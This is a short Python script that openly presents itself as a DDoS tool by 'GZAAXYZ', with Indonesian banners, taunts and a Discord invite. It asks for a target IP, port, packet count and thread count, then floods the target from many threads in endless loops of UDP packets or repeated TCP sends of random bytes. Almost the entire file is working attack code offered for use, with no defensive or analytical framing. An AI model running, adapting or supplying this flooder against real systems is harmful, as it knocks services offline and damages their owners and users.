#!/usr/bin/env python3
#Semoga Tembus Ya Dek
#Ddos by GZAAXYZ
#Join My T3Am : https://discord.gg/GQr8EdGcds
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by Gzaaxyz")
print("Jangan Abuse Ya Kids")
print("BANTAI KIDS ")
ip = str(input(" DdosAttackByGzaaxyz | Ip:"))
port = int(input(" DdosAttackByGzaaxyz | Port:"))
choice = str(input(" DdosAttackByGzaaxyz | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByGzaaxyz | Packets:"))
threads = int(input(" DdosAttackByGzaaxyz | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | GZAAXYZ |")
		except:
			print("[!] | Server down kids!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" GZAAXYZ NIH KIDS!!!")
		except:
			s.close()
			print("[*] Down lagi kids")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()